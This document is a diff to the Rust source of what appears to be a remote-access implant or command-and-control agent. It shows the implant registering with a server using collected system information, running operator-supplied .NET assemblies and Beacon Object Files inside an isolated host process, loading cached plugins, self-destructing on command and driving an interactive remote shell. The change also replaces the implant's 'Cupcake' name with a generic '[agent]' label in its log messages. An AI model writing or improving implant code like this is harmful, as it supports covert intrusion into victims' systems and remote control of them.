@@ -233,7 +233,7 @@ impl MessageHandler {
                         idle_multiplier *= 2;
                         consecutive_idle_count = 0;
                         crate::utils::db_print(&format!(
-                            "[Cupcake] Network idle detected, increasing heartbeat interval to {}x",
+                            "[agent] Network idle, heartbeat interval {}x",
                             idle_multiplier
                         ));
                     }
@@ -273,18 +273,18 @@ impl MessageHandler {
         crate::utils::db_print("[Cupcake] register() started...");
         // 收集系统信息
         let sys_info = SystemInfo::collect();
-        crate::utils::db_print("[Cupcake] SystemInfo collected.");
+        crate::utils::db_print("[agent] SystemInfo collected.");
         
         // 初始化传输层（某些协议如 DNS 需要 UUID）
         self.transport.initialize(&sys_info.uuid);
         
         // 构造注册消息
         let register_msg = sys_info.to_register_message();
-        crate::utils::db_print("[Cupcake] Sending Register message...");
+        crate::utils::db_print("[agent] Sending Register message...");
         
         // 发送注册消息
         self.send_message(&register_msg).await?;
-        crate::utils::db_print("[Cupcake] Register message sent.");
+        crate::utils::db_print("[agent] Register message sent.");
         
         Ok(())
     }
@@ -664,35 +664,48 @@ impl MessageHandler {
             "self_destruct" => {
                 crate::utils::self_destruct().await
             }
-            // PPID-isolated .NET host when isolated-exec is on
+            // .NET: product path = isolated iso_host CLR (minimal/standard both have isolated-exec).
+            // In-process CLR only when isolated-exec is off (legacy thin builds).
             #[cfg(feature = "isolated-exec")]
             "execute_assembly" => {
                 let assembly = command_payload
                     .data
                     .as_deref()
-                    .and_then(|d| base64::engine::general_purpose::STANDARD.decode(d.trim()).ok());
+                    .and_then(|d| {
+                        base64::engine::general_purpose::STANDARD
+                            .decode(d.trim())
+                            .ok()
+                    });
                 match assembly {
-                    Some(bytes) => {
-                        let args: Vec<String> = command_payload
-                            .command_content
-                            .split_whitespace()
-                            .map(|s| s.to_string())
-                            .collect();
+                    Some(bytes) if !bytes.is_empty() => {
+                        // command_content = raw args string from panel (space-separated or free text)
+                        let args_line = command_payload.command_content.trim();
+                        let args: Vec<String> = if args_line.is_empty() {
+                            Vec::new()
+                        } else {
+                            // Prefer JSON array if operator sent ["a","b"]; else single-string argv
+                            if let Ok(v) = serde_json::from_str::<Vec<String>>(args_line) {
+                                v
+                            } else {
+                                args_line
+                                    .split_whitespace()
+                                    .map(|s| s.to_string())
+                                    .collect()
+                            }
+                        };
                         let mut r =
                             crate::isolated_exec::run_dotnet_isolated(&bytes, &args).await;
                         r.req_id = command_payload.req_id.clone();
                         r
                     }
-                    None => CommandResult {
+                    _ => CommandResult {
                         stdout: String::new(),
-                        stderr: "execute_assembly: missing base64 data (stage iso_host if missing)"
-                            .into(),
+                        stderr: "execute_assembly: missing base64 assembly data".into(),
                         path: None,
                         req_id: command_payload.req_id.clone(),
                     },
                 }
             }
-            // In-process .NET when isolated-exec off
             #[cfg(all(feature = "plugin", feature = "dotnet", not(feature = "isolated-exec")))]
             "execute_assembly" => {
                 let assembly_data = if let Some(d) = command_payload.data.as_deref() {
@@ -776,30 +789,64 @@ impl MessageHandler {
                     },
                 }
             }
-            // PPID-isolated sacrificial host (preferred when isolated-exec is on)
+            // BOF: product path = isolated iso_host (minimal has isolated-exec, not feature=bof).
+            // In-process Module Overloading only when isolated-exec is disabled.
             #[cfg(feature = "isolated-exec")]
             "bof_exec" => {
                 let content = command_payload.command_content.trim();
-                let bof_b64 = command_payload.data.as_deref().unwrap_or("");
-                match base64::engine::general_purpose::STANDARD.decode(bof_b64.trim()) {
-                    Ok(bytes) => {
-                        let arg_bytes = base64::engine::general_purpose::STANDARD
-                            .decode(content)
-                            .unwrap_or_default();
+                let bof_bytes = if content.starts_with("cached:") {
+                    let id = content[7..].split('|').next().unwrap_or("");
+                    #[cfg(feature = "plugin")]
+                    {
+                        crate::plugin_router::PluginRouter::get_cached_plugin(id)
+                    }
+                    #[cfg(not(feature = "plugin"))]
+                    {
+                        let _ = id;
+                        None
+                    }
+                } else {
+                    let bof_b64 = command_payload.data.as_deref().unwrap_or("");
+                    base64::engine::general_purpose::STANDARD
+                        .decode(bof_b64.trim())
+                        .ok()
+                };
+
+                match bof_bytes {
+                    Some(bytes) => {
+                        let arg_bytes = if content.starts_with("cached:") {
+                            let parts: Vec<&str> = content[7..].splitn(2, '|').collect();
+                            if parts.len() > 1 {
+                                base64::engine::general_purpose::STANDARD
+                                    .decode(parts[1])
+                                    .unwrap_or_default()
+                            } else {
+                                vec![]
+                            }
+                        } else {
+                            // Panel: command_content = base64(args); empty → no args
+                            if content.is_empty() {
+                                vec![]
+                            } else {
+                                base64::engine::general_purpose::STANDARD
+                                    .decode(content)
+                                    .unwrap_or_else(|_| content.as_bytes().to_vec())
+                            }
+                        };
                         let mut r =
                             crate::isolated_exec::run_bof_isolated(&bytes, &arg_bytes).await;
                         r.req_id = command_payload.req_id.clone();
                         r
                     }
-                    Err(_) => CommandResult {
+                    None => CommandResult {
                         stdout: String::new(),
-                        stderr: "bof_exec: bad base64 (stage iso_host PE if missing)".into(),
+                        stderr: "bof_exec: missing COFF data (push plugin data / stage iso_host first)"
+                            .to_string(),
                         path: None,
                         req_id: command_payload.req_id.clone(),
                     },
                 }
             }
-            // In-process BOF only when isolated-exec is off
             #[cfg(all(feature = "bof", not(feature = "isolated-exec")))]
             "bof_exec" => {
                 let content = command_payload.command_content.trim();
@@ -1095,9 +1142,22 @@ impl MessageHandler {
             }
         };
         
-        let mut stdin = child.stdin.take().expect("Failed to get stdin");
-        let mut stdout = child.stdout.take().expect("Failed to get stdout");
-        let mut stderr = child.stderr.take().expect("Failed to get stderr");
+        let (mut stdin, mut stdout, mut stderr) = match (
+            child.stdin.take(),
+            child.stdout.take(),
+            child.stderr.take(),
+        ) {
+            (Some(si), Some(so), Some(se)) => (si, so, se),
+            _ => {
+                error!("Interactive shell missing stdin/stdout/stderr pipes");
+                return CommandResult {
+                    stdout: String::new(),
+                    stderr: "Failed to get shell pipes (stdin/stdout/stderr)".to_string(),
+                    path: None,
+                    req_id: req_id.clone(),
+                };
+            }
+        };
         
         info!("Interactive shell started, entering message loop");
         
